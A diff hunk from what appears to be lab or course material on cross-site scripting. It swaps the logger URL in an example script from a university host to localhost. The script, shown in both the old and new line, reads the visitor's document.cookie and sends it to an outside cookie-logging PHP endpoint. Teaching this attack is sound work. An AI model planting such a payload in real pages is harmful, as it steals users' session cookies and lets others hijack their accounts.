@@ -20,7 +20,7 @@ XSS attack. This entry forces the visitor's browser to send its session cookie t
 ```html
 <script>
 var request = new XMLHttpRequest();
-request.open("GET", "http://student-lem.fri.uni-lj.si/xss-logger/upload-cookies.php?" + document.cookie, true);
+request.open("GET", "http://localhost/ex12/xss-logger/upload-cookies.php?" + document.cookie, true);
 request.send(null);
 </script>
 ```
